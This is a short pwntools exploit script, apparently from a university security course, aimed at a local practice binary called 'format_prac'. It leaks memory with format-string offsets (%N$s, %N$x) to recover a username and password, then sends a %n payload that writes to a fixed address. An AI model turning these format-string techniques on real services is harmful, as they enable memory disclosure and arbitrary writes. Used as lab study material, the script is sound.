from pwn import *

username = ""
password = ""
username = "COMP6447_ADMIN"
password = "SECRETPASSWORD"

context.log_level = 'error'

if (username == "" or password == ""):
    for i in range(40):
        try:
            p = process("./format_prac")
            if username == "":
                p.sendlineafter("Username:\n", "%{}$s".format(i))
                result = p.recvline(timeout=0.1)
            else:
                p.sendlineafter("Username:\n", "COMP6447_ADMIN")
                p.sendlineafter("Enter Password:\n", "%{}$x".format(i))
                result = p.recvline(timeout=0.1)
            print "{}: {}".format(i, result)
            p.close()
        except:
            pass
else:
    p = process("./format_prac")
    p.sendlineafter("Username:\n", username)
    p.sendlineafter("Password:\n", password)

    exploit = p32(0x0804a040)
    exploit += "%14$n"
    p.sendlineafter("well?\n", exploit)
    print p.recvall(timeout=0.5)
